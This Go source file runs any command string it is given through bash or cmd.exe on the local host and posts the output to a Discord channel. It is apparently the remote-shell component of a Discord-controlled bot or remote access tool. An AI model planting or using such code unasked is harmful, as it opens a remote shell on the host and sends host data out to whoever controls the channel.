// Package shell executes local shell commands and streams their combined
// output back to a Discord channel.
package shell

import (
	"os/exec"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
)

const maxChunk = 1800

// Run executes cmdStr on the local host and posts the combined stdout/stderr
// output to channelID in Discord-sized chunks.
func Run(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, cmdStr string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", cmdStr)
	} else {
		cmd = exec.Command("/bin/bash", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		out = append(out, '\n')
		out = append(out, err.Error()...)
	}

	outStr := string(out)
	if len(outStr) == 0 {
		s.ChannelMessageSendReply(channelID, "```bash\n<no output>\n```", ref)
		return
	}

	runes := []rune(outStr)
	for start := 0; start < len(runes); start += maxChunk {
		end := start + maxChunk
		if end > len(runes) {
			end = len(runes)
		}
		var resp strings.Builder
		resp.WriteString("```bash\n")
		resp.WriteString(string(runes[start:end]))
		resp.WriteString("\n```")

		if start == 0 && ref != nil {
			s.ChannelMessageSendReply(channelID, resp.String(), ref)
		} else {
			s.ChannelMessageSend(channelID, resp.String())
		}
	}
}
